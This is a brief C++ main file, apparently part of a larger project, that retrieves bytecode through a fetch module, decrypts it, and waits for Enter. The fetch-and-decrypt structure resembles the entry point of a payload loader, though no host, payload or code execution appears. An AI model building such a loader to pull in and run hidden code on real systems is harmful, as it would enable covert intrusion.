#include "decrypt.hpp"
#include "retrieve/fetch.hpp"
#include "static/vars.hpp"

#include <iostream>
#include <vector>

int main() {
  try {
    std::vector<unsigned char> bytecode = decrypt_bytecode(retrieve_bytecode());
  } catch (const std::exception &e) {
    std::cerr << "[!] Exception: " << e.what() << "\n";
  }

  std::cout << "Press Enter to exit...";
  std::cin.get();

  return 0;
}
